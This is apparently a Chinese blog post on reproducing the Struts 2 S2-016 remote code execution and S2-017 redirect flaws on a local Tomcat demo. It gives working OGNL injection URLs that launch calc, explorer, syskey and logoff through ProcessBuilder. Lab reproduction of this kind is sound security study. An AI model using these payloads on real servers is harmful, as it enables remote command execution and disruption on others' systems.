# Struts 2最新0day破坏性漏洞（远程任意代码执行）等的重现方法 - z69183787的专栏 - CSDN博客
2014年12月08日 10:07:12[OkidoGreen](https://me.csdn.net/z69183787)阅读数：2494
Struts 2的[远程任意代码执行](http://struts.apache.org/release/2.3.x/docs/s2-016.html)和[重定向](http://struts.apache.org/release/2.3.x/docs/s2-017.html)漏洞，是这两天互联网上最重大的安全事件，据说国内互联网企业中，很多电商纷纷中招，应该已经有大规模的用户隐私泄露。这里我们简单总结下怎样在自己机子上重现这些漏洞，这篇日志也是面向对网络安全比较感兴趣的初学者，即使你没有什么经验，也能知道这漏洞到底怎么回事：
首先我们需要下载包含漏洞的Struts 2，在这里：[http://archive.apache.org/dist/struts/](http://archive.apache.org/dist/struts/) 有Struts 1和Struts 2的基本上全部的发行版本。我们点击这个链接：[binaries/](http://archive.apache.org/dist/struts/binaries/) ，就可以找到受漏洞影响的最新版本：Struts
 2.3.15（[struts-2.3.15-all.zip](http://archive.apache.org/dist/struts/binaries/struts-2.3.15-all.zip)），我们就下载这个压缩包。下载完成之后，我们就可以生成Demo项目了：
这里我们首先介绍一种最简单的方法：将上面的压缩包解压后，可以看到“%解压目录%\struts-2.3.15\apps”下有一些war包，这些都是Struts 2的一些简单示例应用，我们选择其中的struts2-blank.war，拷贝到Tomcat的webapps文件夹下，再重启Tomcat，然后就可以访问：[http://localhost:8080/struts2-blank/](http://localhost:8080/struts2-blank/) ，看到一个很简单的页面。我们选择“English”，就会跳转到下面这个URL：
[http://localhost:8080/struts2-blank/example/HelloWorld.action?request_locale=en](http://localhost:8080/struts2-blank/example/HelloWorld.action?request_locale=en)
利用这个URL，就可以做很多坏事了，在Struts 2的官网上已经给出了完整的PoC（proof of concept），例如：[http://struts.apache.org/release/2.3.x/docs/s2-016.html](http://struts.apache.org/release/2.3.x/docs/s2-016.html)
我们如果将上面这个URL换成：
[http://localhost:8080/struts2-blank/example/HelloWorld.action?redirect:http://www.yahoo.com/](http://localhost:8080/struts2-blank/example/HelloWorld.action?redirect:http://www.yahoo.com/)
就会被重定向到雅虎的网站。
更过分的是，如果我将URL换成：
[http://localhost:8080/struts2-blank/example/HelloWorld.action?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'calc'})).start()}](http://localhost:8080/struts2-blank/example/HelloWorld.action?action:%25%7B%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%27calc%27%7D%29%29.start%28%29%7D)
就会自动弹出计算器！如果点击下面的URL，就会跳出Windows的资源管理器（假设我们在Windows系统中）：
[http://localhost:8080/struts2-blank/example/HelloWorld.action?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'explorer'})).start()}](http://localhost:8080/struts2-blank/example/HelloWorld.action?action:%25%7B%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%27explorer%27%7D%29%29.start%28%29%7D)
是不是很神奇？这个问题现在还在蔓延，可谓是今年互联网领域影响最大的一次安全事件了。
最后再给大家附赠两条可以远程执行的命令，这个可以调出来Windows系统加密程序，如下图所示：
[http://localhost:8080/struts2-blank/example/HelloWorld.action?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'syskey'})).start()}](http://localhost:8080/struts2-blank/example/HelloWorld.action?action:%25%7B%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%27syskey%27%7D%29%29.start%28%29%7D)
![](https://img-blog.csdn.net/20130718163912796?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXlzaDEyMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)
最下面这个要谨慎使用，可以强制当前用户注销：
[http://localhost:8080/struts2-blank/example/HelloWorld.action?action:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'logoff'})).start()}](http://localhost:8080/struts2-blank/example/HelloWorld.action?action:%25%7B%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%27logoff%27%7D%29%29.start%28%29%7D)
